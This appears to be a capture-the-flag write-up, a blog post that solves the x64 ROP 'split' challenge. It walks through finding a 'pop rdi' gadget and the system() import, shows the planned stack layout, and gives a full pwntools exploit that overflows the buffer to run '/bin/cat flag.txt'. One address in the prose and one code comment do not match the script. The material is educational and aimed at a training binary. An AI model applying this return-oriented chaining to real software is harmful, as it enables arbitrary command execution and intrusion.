---
layout: post
title: ROP x64 Challenge 2
status: in progress
type: post
published: true
comments: true
date: 2022-07-13
---

## Challenge 2: Split
> The elements that allowed you to complete ret2win are still present, they've just been split apart.  Find them and recombine them using a short ROP chain.


This is the first challenge that really gets into the coolness of ROP exploits. 

Where before we just needed to execute the ret2win function, now there is no single place we need to return to. However, there are 2 parts of code (which are disconnected) that we need to execute in this binary. We first need to place a pointer to the "/bin/cat flag.txt" string into rdi (which is where the first argument to a function is stored) and then we need to cause a system call to happen. Luckily the string and system call already exist in the program so all we have to do is put them together.


When we search within [[pwndbg]] for ways to edit the value of $rdi we get the following:

```
pwndbg> ropper -- --search "pop rdi"
[INFO] File: /tmp/tmplhu8fdig
0x00007ffff7fec24b: pop rdi; jne 0x7ffff80675b8; add rdx, 8; add rax, 3; mov qword ptr [rdi], rdx; ret;
0x00007ffff7fd09c1: pop rdi; pop rbp; ret;
0x00000000004007c3: pop rdi; ret;
```
The pop instruction takes the top value on the stack and places it in the register. Since we control the stack with our buffer overflow, we can control that value and make it whatever we want. The last one shown is ideal for us in this situation as it doesn't cause another bad side effects.

When we print the functions we can also see a location for the system call.
```
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system

```

So what we want to do is run 2 instructions sets, the first starting at 0x40073c and then jump to 0x400560. Luckily the first 2 instructions end with a ret instruction which jumps to the instructions held at the top of the stack. So we want the stack to look like this

```
        | stack          |
        | -------------- |
8 bytes | start buffer   |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | buffer         |
8 bytes | base pointer   |
8 bytes | pop rdi loc    | # gadget to control rdi
8 bytes | ptr to string  | # the value we want to place in rdi
8 bytes | system call loc| # the system call function we want to call
8 bytes | -------------- |

```


This stack overwrite causes the pwnme function to return to the pop rdi instruction. The location of the "/bin/cat flag.txt" string is then placed into the rdi register. The program then returns to the system call location and prints the flag.

```python
#!/usr/bin/python3

from pwn import *

io = process('./split')
# The amount to fill the buffer
junk = b'A' * 0x20
# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

# This is the vaddr of system
# First return to the location of the pop rdi
pop_rdi = p64(0x004007c3)

# The address of the "/bin/cat flag.txt"
addr_of_command = p64(0x00601060)

call_system = p64(0x00400560)
back_junk = b"B" * 20

payload = junk + new_bp + pop_rdi  + addr_of_command +  call_system
payload += back_junk

print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")
print(io.clean(0.5).decode("utf-8"))
io.send(payload)
print(io.clean(0.5).decode("utf-8"))
input("exploit sent hit enter to end")
sleep(1)
```

